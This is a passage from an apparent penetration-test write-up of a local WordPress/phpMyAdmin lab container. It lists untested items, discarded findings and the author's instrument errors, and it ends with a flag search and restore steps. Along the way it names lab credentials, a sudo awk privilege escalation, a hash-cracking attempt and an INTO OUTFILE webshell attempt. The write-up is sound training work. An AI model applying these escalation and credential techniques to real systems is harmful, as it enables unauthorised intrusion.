+<td><strong>C8 — the privilege boundary itself.</strong> <code>www-data</code> cannot read <code>/etc/shadow</code> or <code>/root</code>.</td>
+<td>Same 7-path battery as F2, in the same shell, same identity: 2 of 7 denied. A predicate that answered <code>YES</code> seven times would have proven nothing.</td>
+<td><code>/etc/shadow readable? NO</code> · <code>/root readable? NO</code> (both as <code>uid=33(www-data)</code>)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="not-tested">NOT tested</h2>
+<p>Kept separate from <em>discarded with reason</em>. A count of zero means <strong>untested</strong>.</p>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Why not tested</th>
+<th>Work count</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>The WordPress / File Manager exploitation leg — the class the platform's own description names.</strong></td>
+<td>Blocked one step earlier than the plugin: the connector needs a valid <code>wp-file-manager</code> nonce, which needs an authenticated admin session, and the administrator password is <strong>not present anywhere in the artefact</strong> (no posts, no pages, no comments, no options, no <code>.bash_history</code>, no build layer — all checked, see below). It was not recovered by cracking either.</td>
+<td><strong>2 722</strong> lab-derived candidates tested against the live phpass hash at 1 474 c/s, <strong>0</strong> matches, plus an earlier <strong>34</strong>-candidate ladder, <strong>0</strong> matches. The cracker itself is proven green (§D2 below), so this is a real negative about the <em>ladder</em>, not about the hash.</td>
+</tr>
+<tr>
+<td><strong>The external entry to the SSH chain.</strong> <code>luisillopasswordsecret</code> was obtained from a <code>0777</code> file using root on the artefact. No path was found by which an unauthenticated external client reaches <code>[lab-home]/secret.txt</code>.</td>
+<td>This is the engagement's largest open gap and it is the reason the outcome is PARTIAL.</td>
+<td>Web-reachable file inventory: <strong>224</strong> non-core PHP files enumerated under <code>/var/www/html</code> (excluding <code>wp-includes</code>, <code>wp-admin</code>), <strong>1</strong> <code>.htaccess</code> set (<strong>3</strong> files total), docroot is <code>/var/www/html</code> so <code>/home</code> is outside it. XML-RPC: <strong>80</strong> methods enumerated.</td>
+</tr>
+<tr>
+<td><strong>Whether <code>system.multicall</code> actually amplifies.</strong></td>
+<td>Method confirmed present in <code>system.listMethods</code>; the amplification itself was not run, so no rate was measured.</td>
+<td>1 method list retrieved, <strong>80</strong> methods parsed, <strong>1</strong> of interest confirmed present, <strong>0</strong> multicall requests sent.</td>
+</tr>
+<tr>
+<td><strong>Whether the shipped WordPress would auto-update on a networked deploy.</strong></td>
+<td>The deploy here uses <code>--internal</code>, so there is no egress to <code>api.wordpress.org</code>. Version was measured at <strong>6.5.4</strong> in both a clean throwaway container and the live one. That the version <em>would</em> move on an egress-capable deploy is an <strong>inference from the presence of <code>wp-cron.php</code> and the absence of <code>AUTOMATIC_UPDATER_DISABLED</code></strong>, and it is labelled as such.</td>
+<td>1 grep for <code>AUTOMATIC_UPDATER_DISABLED</code> in <code>wp-config.php</code> → <strong>0</strong> matches; 2 independent version readings, both <code>6.5.4</code>.</td>
+</tr>
+<tr>
+<td><strong>A CVE identifier for WP File Manager 7.2.9 or the bundled elFinder.</strong></td>
+<td>No advisory database was consulted. The only version evidence is the plugin's own <code>readme.txt</code> changelog, quoted verbatim. No CVE number is asserted anywhere in this writeup.</td>
+<td>1 changelog read (<code>readme.txt:140-175</code>), 3 relevant entries quoted.</td>
+</tr>
+<tr>
+<td><strong>Any CVE range for WordPress 6.5.4 core.</strong></td>
+<td>Same reason. Lab 6's writeup records the discipline of reading a CVE from source; nothing here was taken from memory.</td>
+<td>0 advisories retrieved.</td>
+</tr>
+<tr>
+<td><strong>A decode-and-rescan of the whole filesystem for an encoded reward.</strong></td>
+<td>F8 proved that a literal <code>grep</code> misses a base64 secret, so the <code>Reward</code> search cannot be extended to &quot;no reward of any encoding&quot; without this pass. Not run.</td>
+<td>0 files decoded. The reward search stands as <strong>6 literal-pattern sweeps</strong>, and the limitation is named rather than assumed away.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="discarded-with-reason">Discarded with reason</h2>
+<p>Tested, produced a result, and the result was thrown away — with the reason.</p>
+<table>
+<thead>
+<tr>
+<th>Candidate finding</th>
+<th>Result</th>
+<th>Why discarded</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&quot;The <code>AUTH_KEY</code>/<code>NONCE_KEY</code> placeholders make the auth cookie forgeable.&quot;</td>
+<td>The constants <strong>are</strong> placeholders (<code>wp-config.php:51-58</code>, 8 of 8, 27 chars each).</td>
+<td><strong>Refuted by measurement, not by argument.</strong> <code>wp_salt()</code> returns <strong>128</strong> characters and the value does not come from the config (<code>config NONCE_KEY === wp_options nonce_key ? NO</code>). This is <code>method/self-corrections.md</code> §21 exactly: the framework ignores the value that is present and well-formed. Filing it would have been the corpus's second instance of that defect. The residue is filed as F7, scoped to hygiene.</td>
+</tr>
+<tr>
+<td>&quot;<code>INTO OUTFILE</code> as <code>wordpressuser</code> gives a webshell.&quot;</td>
+<td>1 attempt, <code>ERROR 1045 … Access denied</code>.</td>
+<td><code>mariadbd</code> runs <code>--user=mysql</code>; the docroot is <code>www-data</code>-owned. See C3.</td>
+</tr>
+<tr>
+<td>&quot;phpMyAdmin with <code>wordpressuser</code> is a remote path to database takeover.&quot;</td>
+<td>Login <strong>succeeds</strong> (F3).</td>
+<td>Not reachable remotely <em>in this topology</em> — <code>bind-address = 127.0.0.1</code>, <code>3306</code> absent from <code>-p-</code>, and phpMyAdmin's own socket path is <code>localhost</code>. Retained as F3/F5 with the mitigation stated, not as a takeover.</td>
+</tr>
+<tr>
+<td>&quot;The <code>sudo</code> grant allows more than <code>awk</code>.&quot;</td>
+<td>6 interpreters tested, <strong>6 refusals</strong>.</td>
+<td>The negative is anchored: the same session, same identity, same shell, and <code>awk</code> itself succeeded. See C6.</td>
+</tr>
+<tr>
+<td>&quot;<code>[lab-home]/secret.txt</code> gives root directly.&quot;</td>
+<td>It gives <code>luisillo</code>'s SSH password only.</td>
+<td>It is one link in F1, not a bypass of it. Overstating it would have hidden which control actually fails.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="instrumentation-defects">Instrumentation defects</h2>
+<p>Defects in <strong>my own</strong> instruments during this engagement. These are the section
+worth reading: <strong>five of the eight would have deleted a finding, a control, or a
+verdict</strong> (D1, D2, D3, D6, D8), and none of them looked like an error. D3 would
+have deleted F3 outright; D8 would have published a verdict that was never
+obtained.</p>
+<h3 id="d1--a-login-harness-that-reported-wrong-password-for-a-cookie-failure">D1 — A login harness that reported &quot;wrong password&quot; for a cookie failure</h3>
+<p>My first <code>wp-login.php</code> POST sent no <code>wordpress_test_cookie</code>. WordPress rejected
+it <em>before</em> the password was checked, and the body said:</p>
+<pre><code>&lt;strong&gt;Error&lt;/strong&gt;: las cookies están bloqueadas o no permitidas por tu navegador.
+</code></pre>
+<p>I had already tried <code>luisillopasswordsecret</code> at that point. Filing &quot;that
+credential is wrong&quot; on that evidence would have been a false negative produced
+by my own harness — and it is the exact shape of <code>self-corrections.md</code> §13. The
+tell was linguistic, not numerical: a <em>cookie</em> error is not a <em>credential</em> error,
+and the two differ by more than a status code.</p>
+<h3 id="d2--my-positive-control-exercised-a-different-algorithm-than-the-target">D2 — My positive control exercised a different algorithm than the target</h3>
+<p>My first proof that the password-cracking harness worked was
+<code>wp_check_password($known, wp_hash_password($known))</code>. On modern PHP,
+<code>wp_hash_password()</code> emits a <strong>bcrypt <code>$wp$</code></strong> hash. The live target hash is
+<strong>phpass <code>$P$</code></strong>:</p>
+<pre><code>1) phpass canary prefix=$P$  live prefix=$P$  same_algorithm=YES
+2) POSITIVE CONTROL CheckPassword(correct, HashPassword(correct)) = TRUE -&gt; phpass path FIRES
+3) NEGATIVE CONTROL CheckPassword(wrong, HashPassword(correct))   = FALSE (correctly rejects)
+</code></pre>
+<p>My original control proved the <em>bcrypt</em> path fires. It said nothing about the
+phpass path, which is the one that would have to run. The 34-candidate negative
+taken under that control was therefore unbacked at the time. I re-ran the control
+by driving <code>class-phpass.php</code> directly, and only then did the negative become
+evidence. This is <code>self-corrections.md</code> §1 and §18: a control is valid only if it
+comes from the code path that will actually do the work.</p>
+<h3 id="d3--a-phpmyadmin-detector-that-was-always-false">D3 — A phpMyAdmin detector that was always-false</h3>
+<p>My first phpMyAdmin harness judged success by looking for <code>Server version</code> or
+<code>information_schema</code> in the response body, and reported <strong>denied</strong> for all 11
+credential pairs. It was wrong: the login had <strong>succeeded</strong>, and the giveaway was
+in the cookie jar, which I read only after suspecting the answer.</p>
+<pre><code>session cookies: {'phpMyAdmin': 'ajj11hi6ql4v', 'pma_lang': 'en', 'pmaUser-1': '&lt;redacted&gt;',
+                'pmaAuth-1': '&lt;redacted — session token value&gt;'}   # values dropped, keys kept
+</code></pre>
+<p><code>pmaAuth-1</code> is set only on successful authentication. The re-run with a real
+oracle — the auth cookie <strong>and</strong> a rendered <code>information_schema</code> structure page —
+turned 2 of 11 pairs into successes, including <code>phpmyadmin:1234</code>, which is F3.
+Had I trusted the first harness I would have deleted the finding. The root cause
+is that my <code>denied</code> heuristic matched the substring <code>login</code> inside a JavaScript
+message table — an always-false oracle wearing a negative's clothes
+(<code>self-corrections.md</code> §16).</p>
+<h3 id="d4--sudo-awk-hangs-on-stdin-and-i-first-diagnosed-it-wrongly">D4 — <code>sudo awk</code> hangs on stdin, and I first diagnosed it wrongly</h3>
+<p><code>sudo -n /usr/bin/awk '{print &quot;PWNED&quot;}'</code> hung for the full 40 s timeout. My first
+explanation was that my prompt-matching regex had failed to match the output. It
+had not. The real cause is that <code>Defaults use_pty</code> (sudoers:15) gives <code>sudo</code> a
+pty, and an <code>awk</code> <strong>program with no file operand reads stdin</strong>, which was the
+live SSH channel. <code>BEGIN{…}</code> never touches stdin, which is why every F1 payload
+worked. Fix: <code>&lt;/dev/null</code>. The lesson is that a hang and a prompt-miss are
+indistinguishable from the output, and I attributed it to the wrong one until the
+<code>use_pty</code> line explained it.</p>
+<h3 id="d5--a-reward-search-whose-first-pattern-was-too-loose">D5 — A reward search whose first pattern was too loose</h3>
+<p>My first reward grep used <code>FLAG\{|flag\{|CTF\{|_FLAG|HACKING|HTB\{</code> and returned
+<strong>20+ files</strong>, all of them Ubuntu package sources and stylesheets. Narrowed to
+<code>FLAG\{|flag\{|CTF\{</code>, it returned <strong>2</strong>, and both are a jQuery UI CSS class:</p>
+<pre><code>e{background-position:0 -112px}.ui-icon-flag{background-position:-16px -112px}
+</code></pre>
+<p>Reporting &quot;2 files contain a flag&quot; would have been an invented reward attached to
+a real finding — the specific failure <code>README.md</code> warns about. The narrowed
+search and the false positives are both in <em>Reward</em> below.</p>
+<h3 id="d6--an-ajax-oracle-that-could-not-tell-not-registered-from-nonce-rejected">D6 — An AJAX oracle that could not tell &quot;not registered&quot; from &quot;nonce rejected&quot;</h3>
+<p>I probed the File Manager connector unauthenticated, expecting the plugin's
+actions to behave differently from a nonsense action. They did not:</p>
+<pre><code>D1 unknown action      zzz_no_such_action_zzz          http=400 bytes=1 body=0
+D2 mk_file_folder_manager            (no nonce)       http=400 bytes=1 body=0
+D3 mk_file_folder_manager            (bogus nonce)    http=400 bytes=1 body=0
+D4 mk_file_folder_manager_media_upload(bogus nonce)   http=400 bytes=1 body=0
+D5 mk_file_manager_backup            (bogus nonce)    http=400 bytes=1 body=0
+</code></pre>
+<p>Five responses, <strong>byte-identical</strong>, including my own deliberately-unknown-action
+baseline. WordPress answers <code>0</code> for both cases, so this probe <strong>cannot</strong>
+discriminate. Without a working nonce I have no positive, and a negative control
+that returns the same bytes as the positive is not a control
+(<code>self-corrections.md</code> §16). C2 is therefore stated on the source plus the grep
+count, and the <em>external reachability</em> of the connector is filed as <strong>untested</strong>,
+not as proven-safe.</p>
+<h3 id="d7--shell-quoting-ate-my-own-sql">D7 — Shell quoting ate my own SQL</h3>
+<pre><code>ERROR 1064 (42000) at line 1: You have an error in your SQL syntax … near '%s_capabilities%'
+</code></pre>
+<p>The <code>%s</code> in my <code>LIKE '%s_capabilities%'</code> was consumed by an outer quoting layer
+before <code>mysql</code> saw it. I had written the query to look for <code>wp_capabilities</code>, so
+the query that reached the server was not the query I wrote — the same shape as
+<code>self-corrections.md</code> §17. Fixed by piping SQL on stdin (<code>docker exec -i … &lt;&lt;'SQL'</code>)
+so no shell in the path can rewrite it. Worth recording because a silently
+rewritten predicate is a negative that reports itself as a result.</p>
+<h3 id="d8--i-truncated-my-own-evidence-and-lost-a-verdict">D8 — I truncated my own evidence and lost a verdict</h3>
+<p>Testing <code>premiumpassword</code> over SSH, I printed the match buffer with <code>[:120]</code> to
+keep the output readable. For <code>luisillo</code> the truncation cut the line exactly
+where the verdict was, leaving a line that ended in a password prompt and no
+result. A blank and a zero look identical in a report, and a blank here would
+have been filed as &quot;denied&quot; or &quot;no data&quot; without either being true.</p>
+<p>I caught it because the two lines were <em>inconsistent</em> — <code>ubuntu</code> showed <code>DEN</code>
+and <code>luisillo</code> showed nothing, which is not a pattern real authentication
+produces. Re-run without truncation:</p>
+<pre><code>luisillo   / premiumpassword  -&gt;  DENIED
+ubuntu     / premiumpassword  -&gt;  DENIED
+ssh_candidate_pairs_tested = 2
+</code></pre>
+<p>This is <code>self-corrections.md</code> §19 in its purest form: <strong>a blank count is not a
+zero.</strong> The number was never zero; it was cut off.</p>
+<hr />
+<h2 id="reward">Reward</h2>
+<p><strong>No <code>FLAG{}</code> exists in this lab.</strong> Reported as a measured absence, with the
+search, because a report that invents its own reward teaches the reader nothing
+about the finding it is attached to.</p>
+<table>
+<thead>
+<tr>
+<th>Search</th>
+<th>Count</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Whole-filesystem content, <code>FLAG{|flag{|CTF{</code></td>
+<td><strong>2</strong> files matched</td>
+<td>Both are the jQuery UI class <code>.ui-icon-flag{…}</code> in <code>theme.min.css</code> / <code>jquery-ui.min.css</code> — <strong>false positives</strong>, quoted in D5</td>
+</tr>
+<tr>
+<td>Whole-filesystem filenames <code>*flag*</code></td>
+<td><strong>7</strong> paths</td>
+<td><code>phpmyadmin/themes/bootstrap/img/flag.svg</code>, <code>flag-plus.svg</code>, perl <code>waitflags.ph</code> / <code>ss_flags.ph</code>, <code>mariadb/debian-10.11.flag</code>, two WP <code>icon-pointer-flag*.png</code> — all package assets</td>
+</tr>
+<tr>
+<td><code>wp_posts.post_content LIKE '%FLAG{%'</code> or <code>'%flag{%'</code></td>
+<td><strong>0</strong> rows</td>
+<td>Site has <strong>0</strong> published posts and <strong>0</strong> pages</td>
+</tr>
+<tr>
+<td><code>wp_options.option_value LIKE '%FLAG{%'</code></td>
+<td><strong>0</strong> rows</td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>wp_users</code> login or email containing <code>flag</code></td>
+<td><strong>0</strong> rows</td>
+<td>1 user total</td>
+</tr>
+<tr>
+<td><code>wp_options.option_name LIKE '%flag%'</code></td>
+<td><strong>1</strong> row</td>
+<td><code>default_pingback_flag = 1</code> — a WordPress core option, not a reward</td>
+</tr>
+</tbody>
+</table>
+<p>The absence is a property of the artefact, not a position in a sequence. The
+<code>FLAG{}</code> column of <a href="../labs.html"><code>../INDEX.md</code></a> is the single source for
+reward status across the corpus; this lab's cell is <code>—</code>.</p>
+<p><strong>Stated limitation of that search, because F8 proved it matters.</strong> Every row
+above is a <strong>literal-pattern</strong> search (<code>FLAG{</code>, <code>flag{</code>, <code>CTF{</code>, <code>*flag*</code>). F8
+found a secret in this image that is <strong>base64-encoded</strong> and therefore invisible
+to all of them. So the correct claim is <em>&quot;no <code>FLAG{}</code> literal is present&quot;</em>, not
+<em>&quot;no reward is present&quot;</em>. I did not decode every file in the image and re-run the
+pattern, and that sweep is listed below as untested rather than assumed clean.</p>
+<hr />
+<h2 id="not-tested-vs-discarded-with-reason">NOT tested vs discarded with reason</h2>
+<p>The two lists are kept apart above, per the runbook: <em>not tested</em> means no result
+was obtained (a count of zero is <strong>untested</strong>), <em>discarded with reason</em> means a
+result was obtained and thrown away. Five items are discarded with a reason and
+seven are not tested. The most consequential line in either list is the first
+entry of <em>NOT tested</em>: the class the platform's own description names was not
+exploited, because the administrator password that gates it is not in the
+artefact. The second is the decode-and-rescan in <em>Reward</em>, which F8 made
+necessary.</p>
+<hr />
+<h2 id="lab-design-observations">Lab-design observations</h2>
+<ul>
+<li><strong>The declared class and the shipped plugin do not line up.</strong> The description
+names &quot;WordPress (plugin File Manager) exploitation&quot;. WP File Manager 7.2.9 is
+installed and active, and its own changelog for that version reads
+<code>* Trash Folder &amp; Security Fixes.</code> (<code>readme.txt:144</code>) — i.e. the shipped version
+is the one carrying the security fix, and the connector is nonce-gated. The
+installed plugin is better defended than the description implies. The
+escalation the lab actually teaches is the <code>sudoers</code> line, and it is
+independent of WordPress entirely.</li>
+<li><strong>The plugin directory is owned by <code>root</code> while the rest of <code>wp-content</code> is
+<code>www-data</code></strong> — <code>wp-file-manage</code> is <code>drwxr-xr-x root root</code>, every other plugin
+is <code>www-data www-data</code>. Measured consequence: <code>www-data</code> <strong>cannot</strong> write to
+the plugin's own directory (1 of 4 write predicates denied, F2), so even a
+fully exploited File Manager could not rewrite the plugin that granted it. That
+is a property of how the lab author installed it by hand (visible in
+<code>[lab-home]/luisillo/.bash_history</code>), not a designed control.</li>
+<li><strong>Three vhosts, one of them named <code>wordpress</code> pointing at a directory named
+<code>wordpress</code>,</strong> and the site's own canonical URLs are <code>http://escolares.dl/wordpress</code>
+(rewritten from <code>http://[net-0-2]</code> in <code>/root/.mysql_history:15</code>). Three names
+for one application is a trap for a flat wordlist, and it is the mirror image
+of lab 32's deception — here the names are honest.</li>
+<li><strong>The credential file is the whole puzzle.</strong> A <code>0777</code> root-owned file holding
+one user's plaintext password, read by a <code>www-data</code> shell, is the intended
+pivot, and the intended first shell is the File Manager. Break either link and
+the lab has no path.</li>
+</ul>
+<hr />
+<h2 id="restore">Restore</h2>
+<p>Recreated from the image, not by undoing edits:</p>
+<pre><code>$ docker rm -f escolares_container &amp;&amp; docker run -d --network=esc102net --name escolares_container escolares
+172.21.0.2
+</code></pre>
+<p>Verified with a <strong>positive</strong> check — the service answering again, not the process
+being alive:</p>
+<pre><code>GET /            http=200 bytes=6738
+GET /wordpress/  http=200 bytes=84176
+GET /phpmyadmin/ http=200 bytes=18605
+</code></pre>
+<p>And verified that no artefact of mine survived: <code>/root</code> is back to its six shipped
+entries (<code>.bash_history .bashrc .local .mysql_history .profile .ssh</code>, the two
+<code>ESC102_MARKER*</code> files are gone) and <code>/tmp</code> holds only <code>.secret.txt</code> — the six
+probe files I <code>docker cp</code>'d in are gone with the container, and <strong><code>.secret.txt</code>
+is not mine</strong>: it is in the shipped image (F8), and a file another principal
+created is not mine to delete, so it was left exactly as shipped. Finding it is
+what produced F8; had I trusted an <code>ls /tmp</code> that I expected to be empty, I would
+have deleted it and taken the finding with it.</p>
+<p>Nothing outside this container and this engagement was touched, and no image,
+network or volume belonging to any other lab was reclaimed.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
